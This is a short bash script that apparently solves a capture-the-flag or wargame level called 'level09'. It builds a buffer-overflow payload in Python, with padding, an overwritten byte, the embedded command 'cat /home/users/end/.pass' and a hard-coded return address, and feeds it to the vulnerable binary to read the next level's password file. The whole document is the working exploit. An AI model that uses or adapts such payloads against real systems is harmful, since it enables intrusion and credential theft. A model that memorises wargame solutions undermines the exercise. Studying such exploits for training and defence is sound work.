#!/usr/bin/env bash

python -c 'print "A"*40 + "\xff" + "B" * 158 +  "cat /home/users/end/.pass\x00" + 102 * "C"+ "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09
./level09 < /tmp/level09
